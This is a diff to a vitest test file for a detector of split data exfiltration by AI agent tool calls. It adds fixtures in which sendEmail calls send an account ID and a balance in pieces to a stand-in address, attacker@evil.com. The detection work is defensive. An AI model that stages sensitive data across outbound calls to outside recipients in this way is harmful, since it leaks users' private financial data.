@@ -6,6 +6,7 @@ import { describe, it, expect } from 'vitest';
 import { detectSplitExfiltration } from '../../src/classifiers/split-exfiltration-detector.js';
 import { createSession } from '../../src/engine/session.js';
 import type { ToolCallContext } from '../../src/types/context.js';
+import type { SensitiveEntity } from '../../src/layers/sensitive-entities.js';
 
 const OUTBOUND_TOOLS = ['sendEmail', 'postWebhook', 'uploadChunk'];
 
@@ -22,12 +23,22 @@ function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
 }
 
 function makeSessionWithOutboundHistory(
-  calls: Array<{ toolName: string; turnId: string; bytes: number; numerics?: number[] }>,
-  opts: { privilegedValues?: string[] } = {},
+  calls: Array<{
+    toolName: string;
+    turnId: string;
+    bytes: number;
+    numerics?: number[];
+    destination?: string;
+    text?: string;
+  }>,
+  opts: { privilegedValues?: string[]; sensitiveEntities?: SensitiveEntity[] } = {},
 ): ReturnType<typeof createSession> {
   const session = createSession();
   for (const val of opts.privilegedValues ?? ['123-45-6789']) {
     session.privilegedValues.add(val);
+  }
+  for (const entity of opts.sensitiveEntities ?? []) {
+    session.sensitiveEntities.push(entity);
   }
   for (const call of calls) {
     session.toolCallHistory.push({
@@ -38,6 +49,12 @@ function makeSessionWithOutboundHistory(
     session.outboundBytesByTurn.set(call.turnId, call.bytes);
     if (call.numerics && call.numerics.length > 0) {
       session.outboundNumericArgsByTurn.set(call.turnId, call.numerics);
+    }
+    if (call.destination) {
+      session.outboundDestinationByTurn.set(call.turnId, call.destination);
+    }
+    if (call.text) {
+      session.outboundTextByTurn.set(call.turnId, call.text);
     }
   }
   return session;
@@ -117,6 +134,102 @@ describe('detectSplitExfiltration', () => {
     });
   });
 
+  describe('fires on repeated unauthorized destinations with correlated sensitive content', () => {
+    it('should detect staged exfiltration when the same unauthorized destination receives multiple chunks', () => {
+      const session = makeSessionWithOutboundHistory(
+        [
+          {
+            toolName: 'sendEmail',
+            turnId: 'turn-000',
+            bytes: 120,
+            destination: 'attacker@evil.com',
+            text: '{"recipient":"attacker@evil.com","body":"Customer ID: ACCT-99887766"}',
+          },
+        ],
+        {
+          privilegedValues: [],
+          sensitiveEntities: [
+            {
+              type: 'account_id',
+              rawValue: 'ACCT-99887766',
+              canonicalValue: 'acct99887766',
+              sourceTool: 'readBalanceSheet',
+              fieldName: 'accountId',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+            {
+              type: 'currency_amount',
+              rawValue: '$15,234.50',
+              canonicalValue: '15234.50',
+              sourceTool: 'readBalanceSheet',
+              fieldName: 'balance',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+          ],
+        },
+      );
+
+      const ctx = makeCtx({
+        toolArguments: {
+          recipient: 'attacker@evil.com',
+          body: 'Balance: 15234.50',
+        },
+      });
+
+      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
+      expect(result).not.toBeNull();
+      expect(result?.destinationCluster).toBe(true);
+      expect(result?.destination).toBe('attacker@evil.com');
+      expect(result?.destinationCallCount).toBe(2);
+      expect(result?.matchedFields).toEqual(expect.arrayContaining(['ACCT-99887766', '$15,234.50']));
+    });
+
+    it('should ignore repeated sends to authorized destinations', () => {
+      const session = makeSessionWithOutboundHistory(
+        [
+          {
+            toolName: 'sendEmail',
+            turnId: 'turn-000',
+            bytes: 120,
+            destination: 'finance@corp.internal',
+            text: '{"recipient":"finance@corp.internal","body":"Account ACCT-99887766"}',
+          },
+        ],
+        {
+          sensitiveEntities: [
+            {
+              type: 'account_id',
+              rawValue: 'ACCT-99887766',
+              canonicalValue: 'acct99887766',
+              sourceTool: 'readBalanceSheet',
+              fieldName: 'accountId',
+              confidence: 'high',
+              timestamp: Date.now(),
+            },
+          ],
+        },
+      );
+
+      const ctx = makeCtx({
+        toolArguments: {
+          recipient: 'finance@corp.internal',
+          body: 'ACCT-99887766',
+        },
+      });
+
+      const result = detectSplitExfiltration(
+        ctx,
+        session,
+        OUTBOUND_TOOLS,
+        undefined,
+        ['corp.internal'],
+      );
+      expect(result).toBeNull();
+    });
+  });
+
   describe('does not fire on benign cases', () => {
     it('should return null for non-outbound tools', () => {
       const session = makeSessionWithOutboundHistory([
@@ -186,6 +299,8 @@ describe('detectSplitExfiltration', () => {
       detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
       expect(session.outboundBytesByTurn.has(ctx.turnId)).toBe(true);
       expect(session.outboundBytesByTurn.get(ctx.turnId)).toBeGreaterThan(0);
+      expect(session.outboundTextByTurn.get(ctx.turnId)).toContain('some data');
+      expect(session.outboundDestinationByTurn.get(ctx.turnId)).toBe('user@example.com');
     });
   });
 });
